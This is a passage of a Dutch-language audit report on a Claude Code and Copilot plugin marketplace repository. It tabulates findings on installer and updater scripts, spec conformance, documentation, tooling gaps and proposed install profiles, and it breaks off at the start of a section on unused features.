| portfolio-v3 | medium | De fix met `defaultEnabled:false` en bundles heeft drie valkuilen | Repro 2.1.283: (1) bestaande installs blijven enabled; (2) `claude plugin install <p>` met een expliciete naam installeert disabled; (3) een default-on bundle zet opt-in dependencies aan | Laat het installer daarna `claude plugin enable` draaien, voeg een eenmalige migratie met een marker toe en zet bundles ook op `defaultEnabled:false` | S |
| install-update-2 | medium | **Opgelost in de920ea:** `while read` in plaats van `mapfile` (`install.sh:89-92`, `update-plugins.sh:73-74`); `BASH32=/pad/naar/bash-3.2` draait de installer- en updatertests onder bash 3.2. Op macOS met de standaard bash 3.2 stopt de one-liner bij `mapfile` | toen `install.sh:72/74`, `update-plugins.sh:31-32`. Repro met bash 3.2.57: `mapfile: command not found`. Niet relevant voor jouw Linux/WSL/Windows | Gebruik een `while read`-lus, of faal vroeg als `BASH_VERSINFO<4` | S |
| install-update-3, docs-5 | medium | **Opgelost in de920ea:** de prompt leest `/dev/tty`, zonder terminal stopt het script met een verwijzing naar `MY_CLAUDE_SKILLS_YES=1` (`install.sh:61-72`), en alles draait vanuit `main()`. README bijgewerkt in de docs-pass. Onder `curl \| bash` leest de desktop-app-prompt het script zelf en breekt altijd af (alleen macOS met Claude.app). De README-tekst over de desktop-app is verouderd | toen `install.sh:50-56` `read -r -p`. Repro: "Aborted at your request." | Gebruik `read … </dev/tty` met een fallback naar `MY_CLAUDE_SKILLS_YES`, en een `main()`-wrapper | S |
| install-update-6 | medium | **Opgelost in de920ea:** een mislukte fetch of een lege lijst stopt met een foutmelding en exit 1 (`install.sh:90-94`). Een mislukte fetch van het manifest wordt ingeslikt: "Installed 0 plugin(s)", exit 0 | toen `install.sh:72` process substitution | Lees de lijst uit de marketplace-clone of uit `claude plugin list --json --available`, en faal bij een lege lijst | S |
| install-update-7 | medium | **Opgelost in de920ea:** de hook wordt door het bestand heen geschreven (`cat "$tmp" > "$SETTINGS"`, `install.sh:264-270`), zodat een symlink blijft; een `settings.json` die geen gewone JSON is, blijft ongemoeid met een waarschuwing en de JSON om met de hand toe te voegen. Een ongeldige `settings.json` wordt stil overgeslagen, en een gesymlinkte `settings.json` wordt vervangen door een regulier bestand met 0600 | toen `install.sh:207` `jq … > tmp && mv` | Valideer eerst met `jq empty`, schrijf door de symlink heen en ruim op met `trap` | S |
| install-update-8 | medium | **Opgelost in 27e0354:** het script draait in een eigen scope (`install.ps1:25`) en roept onder `irm \| iex` nooit `exit` aan; als bestand eindigt het met exit 1 als een plugin faalde (`:365`). Bij `irm \| iex` sluit `exit` het PowerShell-venster, en variabelen lekken naar de sessie | toen `install.ps1:52` `exit 0`, `:154` `exit 1`. Repro met pwsh 7.5.2 | Wikkel het script in `& { param(...) … } @args` en gebruik `return`/`throw` | S |
| install-update-10 | medium | **Deels opgelost:** `install.ps1` installeert pyright via `npm.cmd` (d864d97, `install.ps1:191-202`). Open: de docker-check voor `terraform` ontbreekt nog. `install.ps1` installeert pyright niet (de README zegt van wel) en slaat de docker-check over | toen gaf `grep pyright\|docker install.ps1` niets. README:28 | Voeg beide toe en gebruik `npm.cmd` | S |
| install-update-11 | medium | **Opgelost in 27e0354:** `npm.cmd` en `agent-browser.cmd` (`install.ps1:149,151`), en een mislukte optionele tool geeft alleen een waarschuwing, zodat de hook-registratie altijd draait (niet op echte Windows getest; PSScriptAnalyzer-regels voor 5.1 zijn schoon). In Windows PowerShell 5.1 gaat `& npm` naar `npm.ps1`, wat door de Restricted-policy wordt geblokkeerd (plausibel, niet op Windows getest) | toen `install.ps1:93,95` met `$ErrorActionPreference='Stop'` | Roep `npm.cmd` en `agent-browser.cmd` aan en gebruik try/catch, zodat de hook-registratie altijd draait | S |
| install-update-12 | medium | **Nog open.** Op Fedora (dnf) wordt het niet-bestaande pakket `node` gevraagd | `install.sh:40`. mdapi f43 kent `nodejs`, niet `node` | Map pakketnamen per package manager | S |
| critic-2 | medium | **Opgelost in 809d05c:** `.gitattributes` houdt `*.sh`, `*.ere`, `.githooks/*` en `tools/attribution-guard/**` op LF; de check op `\r` in `validate.py` is er niet. Er is geen `.gitattributes`. Op Windows met `core.autocrlf=true` krijgen `.sh`-bestanden CRLF, waardoor de claude-security-hook met exit 2 afsluit en `/claude-security` blokkeert | CRLF-simulatie: `sh hooks.sh banner` → "Syntax error", exit 2. Exit 2 op UserPromptExpansion betekent volgens de docs dat de expansion geblokkeerd wordt | Voeg `.gitattributes` toe met `* text=auto eol=lf`, `*.sh text eol=lf`, `*.ps1 text eol=crlf` en `*.png binary`, en laat `validate.py` op `\r` checken | S |
| copilot-vscode-2 | medium | **Opgelost in 4a747dd:** de updater werkt ook de Copilot-kopieën bij, zonder install-loop (`update-plugins.sh:36-41`). De dagelijkse sync bereikt alleen Claude Code. VS Code- en Copilot-kopieën worden nooit ververst | toen gebruikte `update-plugins.sh:22,27` alleen `claude` | Voeg een Copilot-tak toe: `copilot plugin marketplace update` en `copilot plugin update --all`, zonder install-loop | S |
| install-update-17, spec-7 | low / medium | **Nog open.** Plugins die uit `marketplace.json` verdwijnen blijven als wees geïnstalleerd, waaronder `explanatory-output-style`, dat verwijderd werd omdat het met caveman conflicteerde | Geen `renames` of `forceRemoveDeletedPlugins`. Weggevallen: dotnet-diag, dotnet-upgrade, explanatory-output-style | Voeg `forceRemoveDeletedPlugins: true` en `renames` toe | S |
| install-update-4 | low | **Deels opgelost in de920ea:** alleen plugins die na de vorige run in de marketplace kwamen, worden nog automatisch geïnstalleerd, zonder te vragen (alleen een regel in de log). De updater installeert stil nieuwe plugins die code uitvoeren, verder dan native auto-update doet (security-kant van -1) | toen `update-plugins.sh:37-39`, nu `:95-98`. Docs: "no entry field installs a plugin" | Fix samen met -1 | S |
| install-update-9 | low | **Opgelost in 27e0354:** de registratie test op het geparste object en vervangt een eerdere entry (`install.ps1:269-285`); een lege `settings.json` telt als `{}`. Windows: de check "already registered" matcht nooit, dus elke herhaalde run voegt een extra hook toe. Een lege `settings.json` laat het script crashen | toen `install.ps1:136` enkele backslash tegenover JSON `\\`. Drie runs gaven drie hooks | Test op het geparste object en behandel een leeg bestand als `{}` | S |
| install-update-13 | low | **Nog open.** apt installeert Node 12 of 18, terwijl agent-browser ≥24 vraagt | jammy 12.22, noble 18.19. `engines: >=24.0.0` | Check de major-versie en bied NodeSource of fnm aan | S |
| install-update-14 | low | **Deels opgelost in b073a5a:** de installers en de updater volgen `CLAUDE_CONFIG_DIR` (`install.sh:117,272`, `install.ps1:129`, `update-plugins.sh:15`, `.ps1:21`). Open: `CLAUDE_CODE_PLUGIN_CACHE_DIR`. Hard-gecodeerde `~/.claude`-paden negeren `CLAUDE_CONFIG_DIR` en `CLAUDE_CODE_PLUGIN_CACHE_DIR` | toen `install.sh:197`, `update-plugins.sh:29` | Respecteer de env-variabelen | S |
| install-update-15 | low | **Nog open.** Geen lock, de throttle-stamp wordt vóór succes gezet, en twee sessies tegelijk geven 44 in plaats van 22 installs. Sinds 57bb71e is de stamp per config-dir: sessies in verschillende config-dirs draaien dus allebei, en delen de log, de Copilot-tak, de guard-refresh en de updaterkopie. De kopregel van elke run in de log noemt nu zijn config-dir, en de `.ps1` ververst zijn kopie via een eigen tijdelijk bestand (`$PSCommandPath.$PID`, zoals de `.sh` met `$$`). Open: twee runs tegelijk schrijven door elkaar in dezelfde log | `update-plugins.sh:23-27`, `.ps1:30-34` | Gebruik een `mkdir`-lock en zet de stamp pas na succes | S |
| install-update-v2 | low | **Nog open.** De stamp wordt vóór de claude- en jq-checks gezet, dus zonder claude op PATH zijn er 6 uur geen updates en geen log | `update-plugins.sh:27` vóór `:29-31`, `.ps1:34` vóór `:36-37` | Draai eerst de checks en de log-redirect. Val terug op `$HOME/.local/bin/claude` | S |
| install-update-16 | low | **Nog open.** Er is geen uninstall-pad. Na `marketplace remove` faalt de achtergebleven hook bij elke run | Log: "Failed to update marketplace" | Voeg `--uninstall` en een README-sectie toe | S |
| install-update-19 | low | **Opgelost in de920ea:** na een geslaagde marketplace-update ververst de updater zijn eigen kopie uit de marketplace-clone (vanaf de volgende run; `update-plugins.sh:46-60`, `.ps1:54-71`). Machines met een kopie van vóór de920ea hebben die code nog niet: draai daar de installer één keer opnieuw (of kopieer `scripts/update-plugins.*` uit de clone). De hook draait een bevroren kopie van de updater, dus fixes in de repo bereiken bestaande machines nooit | toen `install.sh:189-196`, `install.ps1:132` | Laat de hook naar de marketplace-clone wijzen, of gebruik native autoUpdate | S |
| install-update-20 | low | **Opgelost in de920ea:** `main()` (`install.sh:26`), aangeroepen op de laatste regel (`:305`). Geen `main()`-wrapper, dus een afgebroken download voert een half script uit | toen bestond `install.sh` uit top-level statements (`:6-212`) | Voeg `main "$@"` toe | S |
| install-update-22 | low | **Nog open.** Gaat uit van sudo: als root zonder sudo (containers, sommige WSL-setups) falen de base-deps | `install.sh:31-32,153,176` | Check eerst `id -u` en of sudo bestaat | S |
| install-update-23 | low | **Nog open** (alleen voor .NET print het script een instructie). User-local installs passen PATH alleen voor het installer-proces aan | `install.sh:79,123,180-181,215,219` | Schrijf PATH naar het shell-rc-bestand of print een duidelijke instructie | S |
| install-update-v1 | low | **Nog open.** In pwsh 7 faalt de desktop-app-detectie via Appx volgens de docs (plausibel) | `install.ps1:59` `Get-AppxPackage` | Gebruik `Test-Path "$env:LOCALAPPDATA\Packages\*Claude*"` in try/catch | S |
| copilot-vscode-13 | low | **Opgelost in 4a747dd** volgens de eerste aanbeveling: `settings/vscode-settings.jsonc` zet `chat.useClaudeHooks` uit; een `timeout` heeft de hook niet. De SessionStart-hook in `~/.claude/settings.json` draait synchroon (30 s timeout) als `chat.useClaudeHooks` aan staat | `install.sh:262` `async: true` doet niets in VS Code Local | Houd `chat.useClaudeHooks` uit, of voeg `"timeout": 60` toe | S |
| install-update-24 | info | **Nog open.** `update.log` wordt nooit geroteerd (~2,5 MB per jaar). De `.ps1` leunt op Start-Transcript | `update-plugins.sh:31` `exec >>"$LOG"`, `.ps1:37` `Start-Transcript` | Voeg rotatie toe | S |

### 3.4 Spec-conformiteit

| ID | Ernst | Bevinding | Bewijs | Aanbeveling | Effort |
|---|---|---|---|---|---|
| spec-1 | high | Vendored plugins met een `version` in hun manifest krijgen nooit gesyncte content; de update-hook verbergt dat | Docs: "a manifest that pins "version": "1.0.0" keeps every user on the cached copy". Betreft onder meer claude-security, dotnet, dotnet-test en dotnet-aspnetcore | Herschrijf `version` in `sync.sh` na elke copy (bijvoorbeeld naar upstream-sha of een content-hash). Eenmalig `uninstall --keep-data` + `install` | M |
| spec-4 | medium | Drie helper-skills van dotnet-test zijn onbereikbaar omdat beide invocation-flags uit staan | `filter-syntax/SKILL.md:4-5` e.a.: `user-invocable: false` + `disable-model-invocation: true` | Overlay die `disable-model-invocation` weghaalt; meld alle drie upstream | S |
| portfolio-v2 | medium | De inventaris mist 7 workflows (~1,3K tok) en onderschat agents. code-modernization heeft een naamconflict tussen een command en een workflow | `plugins-reference`: `workflows/` wordt standaard gescand. `modernize-extract-rules` bestaat twee keer | Tel `workflows/` mee in `gen-catalog.py` en meld het conflict upstream | S |
| critic-7 | low | De Phase 1-commando's van codebase-onboarding botsen met de eigen grant en met Python op Ubuntu/WSL: `python` in plaats van `python3`, en PEP 668 blokkeert `pip install` | `SKILL.md:33-35` tegenover `:8`. `EXTERNALLY-MANAGED` in Ubuntu 24.04. Open ranges in `requirements.txt` | Meld het upstream. Of, via een overlay: `uv run --with-requirements "${CLAUDE_SKILL_DIR}/scripts/requirements.txt" python3 …` | S |
| spec-2 | low | `lspServers` in dotnet `plugin.json` wijst naar het Copilot-formaat `lsp.json`, wat bij elke sessie een LSP-configfout geeft | `plugin.json:6` `"./lsp.json"`. Debug: "LSP config validation failed". Upstream `d8da1dc` heeft dit gefixt | Sync naar ≥ `d8da1dc` of gebruik een overlay. De fix bereikt bestaande installs pas met spec-1 | S |
| spec-9, docs-16 | low | terraform `.mcp.json` gebruikt `${TFE_TOKEN}` zonder default, wat een configfout geeft en de letterlijke placeholder aan docker doorgeeft. `TFE_TOKEN` is nergens gedocumenteerd | `.mcp.json:8`. Debug: "Missing environment variables: TFE_TOKEN" | Gebruik `"-e","TFE_TOKEN"` of `${TFE_TOKEN:-}` via een overlay, en documenteer het in de README | S |
| spec-10, copilot-vscode-3, copilot-cli-9 | low | csharp-patterns: 6 skills hebben een `name` die niet gelijk is aan de mapnaam, en 10 skills hebben een onbekende key `invocable` | `csharp-api-design/SKILL.md:2` `name: api-design` e.a. VS Code laadt ze onder de mapnaam met een warning (gecorrigeerd: ze falen níet stil) | Pas de `to`-paden in `sources.json` aan zodat de mapnaam gelijk is aan de frontmatter-naam, of meld het upstream | S |
| spec-11 | low | dotnet-test-agents: frontmatter die alleen Copilot of Gemini kent wordt genegeerd, waardoor interne agents automatisch gedelegeerd kunnen worden | `code-testing-builder.agent.md:8` `user-invocable: false` | Geen actie nodig, of strip via een overlay | S |
| spec-13 | low | Elke commit op main geeft de 15 plugins zonder versie (gecorrigeerd: 15, niet 16) een nieuwe versie, met cache-churn als gevolg | Repro: "updated from bfdedb37f4a3 to 5f107db929ce" na een commit op een ongerelateerd bestand | Gebruik een content-hash als versie (via CI of een pre-commit-hook voor repo-owned plugins) | S |
| portfolio-4 | low | De pluginnaam `anthropic-skills` botst met de door Claude Code gereserveerde namespace. De vendored skill-creator wordt daardoor overschaduwd | `/context` toont `anthropic-skills:skill-creator \| claude.ai sync`. (De claim over dubbele descriptions is weerlegd) | Hernoem de plugin (bijvoorbeeld `anthropic-curated`) en laat skill-creator vallen | S |
| copilot-cli-11 | low | De frontmatter van de agent `silent-failure-hunter` is geen geldige YAML | `silent-failure-hunter.md:3`. PyYAML: "mapping values are not allowed" | Meld het upstream en voeg YAML-validatie toe in CI | S |
| spec-14 | info | feature-dev-agents noemen tools die niet meer bestaan (LS, NotebookRead, KillShell, BashOutput) | `code-architect.md:4` e.a. | Geen lokale actie; eventueel upstream melden | S |
| spec-v1 | info | De hoofdagent van claude-security leunt op `initialPrompt`, dat Claude Code voor plugin-agents negeert | `claude-security.md:8`. Docs: "Ignored fields: … initialPrompt" | Geen actie; `/claude-security` werkt wel | S |
| copilot-vscode-16 | info | Niet-standaard skill-keys (`invocable`, `hidden`) doen nergens iets | 10 csharp-skills en agent-browser `hidden: true` | Accepteer het of map ze via een overlay naar `user-invocable: false` | S |
| copilot-cli-13 | info | Bij een marketplace uit een lokale map meldt Copilot dat caveman "installed" is, maar registreert hem niet (bug in Copilot) | `copilot plugin list --json` toont hem niet. Vanaf GitHub werkt het wel | Test alleen tegen de marketplace op GitHub | S |
| copilot-cli-16 | info | De dotnet-plugin geeft in Copilot een onschuldige LSP-warning | "lspServers must be an object" voor `.lsp.json`. C# laadt via `lsp.json` | Geen actie | S |

### 3.5 Documentatie

| ID | Ernst | Bevinding | Bewijs | Aanbeveling | Effort |
|---|---|---|---|---|---|
| docs-8 | medium | Er is geen documentatie voor VS Code met GitHub Copilot, terwijl dat juist je doel is | Geen `.vscode/`, `copilot-instructions.md` of `AGENTS.md`; `grep copilot` geeft niets | Zie §6 | M |
| docs-3 | medium | **Opgelost in d8a1906:** de vijf `dotnet-*`-rijen staan er weer; een README-check in `validate.py` is er niet. De plugintabel in de README noemt 18 van de 23 plugins. Alle vijf de `dotnet-*`-plugins zijn per ongeluk verdwenen | Commit 7f61791 verwijderde de hele gecombineerde rij | Voeg de rijen terug toe en laat `validate.py` README tegen marketplace checken | S |
| docs-4 | medium | De tools-tabel klopt niet met `install.ps1`/`install.sh` en mist tools (python3, `TFE_TOKEN`, pwsh voor dotnet-test) | README:23-29 tegenover `install.ps1:35-36,87-126` | Trek de tabel gelijk met de installers | S |
| docs-6, install-update-18 | medium | **Deels opgelost in d8a1906** (en de docs-pass): de README noemt de juiste paden, `CLAUDE_CONFIG_DIR`, de Windows-log en `-Force`. Open: native auto-update. De docs over de SessionStart-hook noemen verkeerde paden (`%LOCALAPPDATA%` in plaats van `%USERPROFILE%\.claude`), geen Windows-log en `-Force`, en zeggen niets over native auto-update | toen README:43 tegenover `install.ps1:133`, `update-plugins.ps1:11,14-16` | Herschrijf de sectie | S |
| docs-7 | medium | Er is geen sectie over uninstallen of troubleshooting | Alleen de koppen Install, Permissions, Plugins, Sync, Adding, Licensing | Voeg beide toe (zie install-update-16 en copilot-vscode-15) | S |
| docs-9 | medium | **Deels opgelost in d8a1906:** MicrosoftDocs/agent-skills staat als high in de trust-tabel. De tabel met code-executie is niet opnieuw nagelopen. De trust-tabel in SECURITY.md mist MicrosoftDocs/agent-skills (high), en de tabel met code-executie is onvolledig | toen `SECURITY.md:11` tegenover `sources.json:100-103`, en `SECURITY.md:59-66` | Vul beide aan | S |
| docs-10 | medium | De licentieverklaring klopt niet: 8 plugin-mappen hebben geen licentiebestand, Azure LICENSE-CODE is niet gevendord en de namen van de notice-bestanden verschillen | README:114. `find` gaf geen LICENSE in onder meer component-documentation, dotnet-* en spec-kit | Kopieer de licenties per plugin en corrigeer de tekst | S |
| docs-11 | medium | **Opgelost:** `--only` met een naam zonder bron geeft exit 2 (64b610a, `sync.sh:43-46`); "Adding a source" noemt de stappen (d8a1906) en de key `name` die `--only` neemt (docs-pass). "Adding a source" mist stappen. `--only` werkt op de bronnaam, dus met een pluginnaam gebeurt stil niets | toen README:105-110, `sync.sh:39,46` | Documenteer de key `name` en maak `--only` strikt (zie sync-ci-18) | S |
| docs-12 | medium | Er is geen begeleiding voor subsets of profielen: de one-liners kunnen geen subset doorgeven en de contextkosten staan nergens | README:7,36. `irm \| iex` kan geen `-Plugin` doorgeven | Documenteer `curl … \| bash -s -- <plugins>` en de profielen (zie §4) | M |
| portfolio-qa-speckit-1 | medium | spec-kit verwijst naar een niet-bestaande `/reload`, installeert ongepind van main en loopt achter op upstream (`converge`) | `SKILL.md:34`. De commands-doc kent alleen `/reload-plugins` en `/reload-skills` | Gebruik `/reload-skills`, pin de versie, neem `converge` op en check ook `.github/skills/speckit-*` | S |
| docs-13, features-6, copilot-cli-12, copilot-vscode-5 | medium / low | **Opgelost in 4a747dd:** `AGENTS.md` en `settings/user-instructions.md`; CONTRIBUTING en CHANGELOG zijn er niet. Er zijn geen `CLAUDE.md`/`AGENTS.md`, CONTRIBUTING of CHANGELOG, terwijl repo-owned en vendored bestanden door elkaar staan | `ls` gaf "No such file". `copilot instruction list` → "No instruction sources found" | Eén `AGENTS.md` (geen CLAUDE.md nodig; Claude Code ≥2.1.277 leest AGENTS.md) met de regels over vendored en repo-owned bestanden en de commando's. Zie §5 | S |
| docs-14 | low | Aanwijzingen voor Windows en WSL ontbreken (merge-recepten alleen in bash, "gebruik WSL voor onderhoud", aparte installs per omgeving) | README:53-65, `sync.sh:26-28` | Voeg PowerShell-recepten en een WSL-notitie toe | S |
| docs-15 | low | De claim "~65% minder output-tokens" voor caveman wordt upstream niet onderbouwd (8,5% en 50% mediaan) | `marketplace.json:244`, README:92, SKILLS.md:382 | Formuleer de claim neutraal | S |
| docs-17 | low | Vendored subsets bevatten gebroken links, en vendored READMEs geven install-commando's voor een andere marketplace | `dotnet-test/README.md:5,11,35,110` → `../dotnet-test-migration/` | Voeg een linkcheck toe in `validate.py` (warning) en vermeld het in de README | S |
| docs-19 | low | **Deels opgelost in d8a1906:** mattpocock-skills staat op 24 skills (17 engineering, 7 productivity); de andere twee punten zijn niet opnieuw nagelopen. Kleine afwijkingen in aantallen: 17 engineering- plus 7 productivity-skills; `azure-networking` ontbreekt in de lijst; de lijst van code-modernization is onvolledig | README:82,85, `marketplace.json:64` | Corrigeer de aantallen | S |
| docs-20 | low | De install-commando's van spec-kit wijken af van upstream (ongepind git HEAD, Python 3.11+) | `spec-kit/SKILL.md:24,27-28` | Pin op `@vX.Y.Z` (zie portfolio-qa-speckit-1) | S |
| docs-v2 | low | Vendored mattpocock-skills verwijzen naar de uitgesloten `/code-review`, dat dan uitkomt bij de ingebouwde `/code-review` | `implement/SKILL.md:13`, `ask-matt/SKILL.md:26`, `tdd/SKILL.md:38` | Vermeld de mapping in de README, of laat de validator waarschuwen op verwijzingen naar uitgesloten skills | S |
| portfolio-qa-compdoc-1 | low | De description van component-documentation is lang (951 chars) en breed, zonder "Not for" | `SKILL.md:3` | Kort in tot 400–500 chars in de derde persoon, met een Not-for-clause. Dat helpt ook het budget | S |
| portfolio-qa-compdoc-2 | low | De live checks hebben geen expliciete kube-context, en GitOps ontbreekt | `SKILL.md:88-93` zonder `--context`. `:66-73` gaat uit van push-deploys via Azure Pipelines (dat past waarschijnlijk bij jou) | Voeg `--context`/`--kube-context` toe en bevestig de context met de gebruiker | S |
| portfolio-qa-compdoc-3 | low | De template spreekt de regel "één taal" tegen: Nederlandse headers in een Engelse template. Er is geen TOC of voorbeeld | `document-template.md:32,46,55,68,89,95,141` | Maak de taal consistent en voeg een TOC toe | S |
| copilot-cli-14 | info | spec-kit hard-codeert de Claude-integratie in zijn tekst | `SKILL.md:13,24,28,34`. Copilot en VS Code lezen `.claude/skills` gewoon | Neutraliseer alleen de tekst: check ook `.github/skills` en schrijf "restart the agent session" | S |
| copilot-vscode-15 | info | Enterprise-policies kunnen plugins, hooks, MCP of het Claude-target stil uitschakelen | `ChatPluginsEnabled`, `ChatStrictMarketplaces`, `ChatHooks`, `ChatMCP`, `Claude3PIntegration` | Neem ze op in de troubleshooting-sectie | S |

## 4. Gaps en portfolio-fit voor jouw stack

**Gaps (grep over `plugins/` en SKILLS.md, geverifieerd)**

| ID | Ernst | Gap | Bewijs | Invulling (zie §7) |
|---|---|---|---|---|
| portfolio-gap-k8s | high | Geen skill voor K8s-manifesten, debugging of kustomize | `kustomiz` 0, `kubeconform\|kube-linter` 0 | KubeShark (landscape-2), eventueel foxj77 (landscape-14), kubernetes-mcp-server read-only (landscape-9) |
| portfolio-gap-helm | high | Geen skill voor Helm-chart-authoring (values.schema.json, helm-unittest) | `values.schema` 0, `helm unittest` 0 | KubeShark `helm-patterns.md`, foxj77 helm-chart-* |
| portfolio-gap-bash | high | Geen bash- of shell-skill en geen shell-LSP | `shellcheck` 1 hit (wizard) | wshobson shell-scripting (landscape-3) en `bash-language-server` als LSP |
| portfolio-gap-yaml | medium | **Opgelost in d864d97:** de repo-owned plugins `yaml-lsp` en `yaml-hooks`. Geen YAML-lint of schema's | `yamllint` 0 | `yaml-language-server` (SchemaStore + CRD-store) als LSP, en een PostToolUse-hook voor yamllint (features-3) |
| portfolio-gap-python | medium | Alleen typing-LSP; uv/ruff/pytest-conventies ontbreken (gap smaller dan eerst gedacht: dotnet-test heeft pytest-extensies) | `ruff` 2 hits, beide in dotnet-test | Astral-skills (landscape-4), of een korte eigen `python-project`-skill met `paths:` |
| portfolio-gap-terraform | medium | Alleen een MCP voor docs-lookup | `plugins/terraform` bevat alleen `.mcp.json`, tflint 0 | hashicorp/agent-skills **zonder** de 9 provider-dev-skills, als apart `terraform-skills`-plugin (landscape-5) |
| portfolio-gap-ci | medium | GitHub Actions-hardening ontbreekt; Azure Pipelines heeft alleen een URL-index | `azure-pipelines/SKILL.md` = 589 regels URL-tabel | awesome-copilot `github-actions-hardening` (landscape-11) |
| portfolio-gap-containers | medium | Geen Dockerfile-skill | `hadolint` 0 | docker/skills @ v0.3.0 (landscape-6) |
| portfolio-gap-observability | medium | Geen PromQL-, alerting-rule- of Grafana-authoring | `promql` alleen Azure-links | grafana/skills-subset (landscape-7) |
| portfolio-gap-incident | medium | Geen skill voor incident-response of postmortems | alleen de Runbooks-sectie in component-documentation | awesome-copilot `incident-postmortem` (landscape-11) |
| portfolio-gap-iac-security | medium | Geen IaC- of container-scanning | `checkov`/`tfsec`/`kube-linter` 0; claude-security is alleen voor app-code | Voorlopig handmatig. Geen sterke bron gevonden (trivy/checkov-skills zijn zwak, niet opnieuw geverifieerd) |
| portfolio-gap-gitops | low | Geen GitOps (Argo/Flux) | `flux` 0 | Alleen als je Flux gaat gebruiken: fluxcd/agent-skills (landscape-8) |
| portfolio-11, landscape-1, features-1, copilot-cli-8 | medium / low | **Opgelost in e101d25:** `azure-agent-skills/.claude-plugin/plugin.json` levert `microsoftdocs` (`https://learn.microsoft.com/api/mcp`). De 32 azure-skills verwachten `mcp_microsoftdocs`, maar geen enkel plugin levert die server. Er is wel een fallback naar `fetch_webpage` | 32/32 SKILL.md, `plugin.json` zonder `mcpServers` | Voeg inline `mcpServers` toe aan de repo-owned `azure-agent-skills/.claude-plugin/plugin.json`: `{"microsoftdocs":{"type":"http","url":"https://learn.microsoft.com/api/mcp"}}`. De naam `microsoftdocs` moet overeenkomen met de skill-verwijzingen (copilot-cli-8) |

Buiten scope gebleven (critic): de omgang met kubeconfig, az-tokens en `TFE_TOKEN` via MCP-servers is niet beoordeeld. Denk erover na voordat je landscape-9 of -10 toevoegt.

**Portfolio-fit per plugin** (relevantie volgens portfolio-3; always-on tokens volgens portfolio-1; Copilot-portabiliteit volgens copilot_mapping)

| Plugin | Relevantie | Always-on tok | Copilot | Voorstel-profiel | Opmerking |
|---|---|---|---|---|---|
| terraform | High | 0 (MCP) | as-is | core | docker + `TFE_TOKEN` (spec-9, security-v5) |
| pyright-lsp | High | 0 (LSP) | cli-only na fix | core | `lsp.json` nodig voor Copilot (copilot-cli-1) |
| component-documentation | High | 351 | as-is | core | description inkorten (qa-compdoc-1) |
| commit-commands | High | 103 | claude-only | core (Claude) | caveman-commit claimt ook `/commit` (portfolio-7) |
| azure-agent-skills | High (core-subset) | 6.963 | as-is | core: azure-core; opt-in: azure-networking/extra | 35% van de listing, 6,4K chars boilerplate, 26 dangling refs (portfolio-12) |
| pr-review-toolkit | Medium | 2.033 | partial | core (Claude) | brede `Bash`-grant in Copilot (copilot-cli-v2) |
| mattpocock-skills | Medium | 1.461 | as-is | core | tracker kent Azure Boards niet |
| claude-security | Medium | 694 | claude-only | core (Claude) | alleen app-code, geen IaC |
| feature-dev | Medium | 238 | mostly | core | |
| codebase-onboarding | Medium | 244 | as-is (risico) | opt-in "docs" | critic-5, critic-7, spec-8 |
| spec-kit | Medium | 160 | mostly | core | qa-speckit-1 |
| anthropic-skills | Medium | 303 | mostly | dev-extras | naamconflict (portfolio-4) |
| powershell | Medium (Windows) | 78 | as-is | windows | inhoud niet gereviewd (critic) |
| dotnet, -aspnetcore, -test, -data, -nuget, -advanced, csharp-patterns | Low | 9.415 samen (dotnet-test 5.344) | as-is/mostly | dotnet (opt-in) | dotnet-test claimt "ALWAYS USE… any language", waardoor pytest-taken naar .NET gaan (portfolio-5) |
| code-modernization | Low | 1.273 (+ workflows) | partial | dev-extras | |
| agent-browser | Low | 334 | mostly | dev-extras | "Prefer agent-browser over any built-in … web tools" (portfolio-10); installeert Chrome met sudo |
| caveman | Optioneel | 1.830 + 5,8K chars/sessie | partial | opt-in | alternatief: built-in `outputStyle: "Concise"` (features-15) |

**Overlap**
- portfolio-6: meer dan zes reviewers (built-in `/code-review` en `/simplify`, pr-review-toolkit, feature-dev, caveman). De IDs zijn wel uniek (`feature-dev:code-reviewer` tegenover `pr-review-toolkit:code-reviewer`), dus de claim van een naamconflict is overdreven. Voeg een README-rij "welke reviewer wanneer" toe.
- portfolio-9: vier spec→plan→implement-flows (spec-kit, mattpocock, feature-dev, plan mode). Een README-notitie over de default-workflow volstaat.
- portfolio-8: codebase-onboarding en component-documentation triggeren allebei op "explain this repo". Voeg een Not-for-clause toe.
- portfolio-10: agent-browser trekt doc-lookups naar zich toe. De claim dat mattpocock `wizard` infra claimt is weerlegd. Zet agent-browser in een opt-in web-profiel.
- portfolio-7: caveman staat standaard aan, met always-on injectie, 20 skills + 1 command (waarvan 6 voor Caveman Cloud; dat dit betaald is, is niet geverifieerd) en triggerconflicten. Maak het opt-in en documenteer `CAVEMAN_DEFAULT_MODE`.
- portfolio-5: zie de tabel.

**Contextkosten**, gegroepeerd: portfolio-1, portfolio-v1, spec-5, features-v2, copilot-vscode-7 (low), copilot-cli-3 (high voor Copilot) en landscape-v2. Alle bronnen van landscape samen zouden de listing ongeveer verdubbelen (+~49K chars, ~12K tok). Voeg nieuwe bronnen daarom gefaseerd toe, en pas nadat de profielen er zijn.

**Voorgestelde install-profielen** (één `profiles.json` voor zowel de Claude- als de Copilot-installer)

```json
{
  "profiles": {
    "core":        ["terraform","pyright-lsp","component-documentation","azure-agent-skills","feature-dev","spec-kit","mattpocock-skills","commit-commands","pr-review-toolkit","claude-security"],
    "docs":        ["codebase-onboarding"],
    "windows":     ["powershell"],
    "dotnet":      ["dotnet","dotnet-aspnetcore","dotnet-test","dotnet-data","dotnet-nuget","dotnet-advanced","csharp-patterns"],
    "dev-extras":  ["anthropic-skills","agent-browser","code-modernization","caveman"]
  },
  "copilotExclude": ["commit-commands","pr-review-toolkit","claude-security","code-modernization","codebase-onboarding"]
}
```

- Het mechanisme is `defaultEnabled:false` op de opt-in-entries, **met** de drie maatregelen uit portfolio-v3: `enable` na een expliciete install, een migratie voor bestaande machines, en bundles ook uitgeschakeld.
- Schakel .NET per repo in via `enabledPlugins` in `.claude/settings.json` of `.github/copilot/settings.json`.
- Op 200K-modellen: zet `"skillListingBudgetFraction": 0.03`–`0.04` in de user-settings (portfolio-v1). `skillOverrides` werkt **niet** voor plugin-skills.
- Let op (critic): in het Copilot-cloudprofiel zitten zonder pyright en commit-commands geen Python- of commit-tools. Leg dat uit, of voeg na de fix `pyright-lsp` toe aan het cli-profiel.

## 5. Ongebruikte Claude Code-mogelijkheden

| Mogelijkheid | Bevinding | Concreet voorbeeld |
|---|---|---|
